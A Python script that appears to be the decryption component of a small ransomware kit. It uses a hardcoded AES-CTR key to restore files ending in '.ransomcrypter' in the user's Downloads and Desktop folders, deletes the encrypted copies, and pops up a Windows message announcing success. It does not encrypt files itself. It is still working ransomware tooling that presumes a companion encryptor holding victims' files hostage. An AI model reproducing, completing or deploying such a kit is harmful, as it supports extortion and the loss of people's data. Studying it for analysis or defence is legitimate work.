import os
import glob
import time
import pyaes
from sys import argv
from pathlib import Path
key = "102efd86a2bec382e7945002e53505a7"

lst_past=["Downloads","Desktop"]

def descrypt(decrypt_file):
    try:
        for file in glob.glob('*.ransomcrypter'):

            keybytes = decrypt_file.encode()
            name_file = open(file, 'rb')
            file_data = name_file.read()
            dkey = keybytes  # 16 bytes key - change for your key
            daes = pyaes.AESModeOfOperationCTR(dkey)
            decrypt_data = daes.decrypt(file_data)

            format_file = file.split('.')
            new_file_name = format_file[0] + '.' + format_file[1]  # Path to drop file

            dnew_file = open(f'{desktop}\\{new_file_name}', 'wb')
            dnew_file.write(decrypt_data)
            dnew_file.close()
    except ValueError as err:
        print('Chave inválida')

for i in lst_past:
    try:
        desktop = Path.home() / i
        #download = Path.home() / "Downloads"
    except Exception:
        pass
    os.chdir(desktop)
    if __name__ == '__main__':
        if key == '102efd86a2bec382e7945002e53505a7':
            descrypt(key)
            for del_file in glob.glob('*.ransomcrypter'):
                os.remove(f'{desktop}\\{del_file}')
            os.system('msg * SUCCESSFULLY DESCRIPTOGRAPHED DATA')
        else:
            print('Chave de liberação inválida!!!')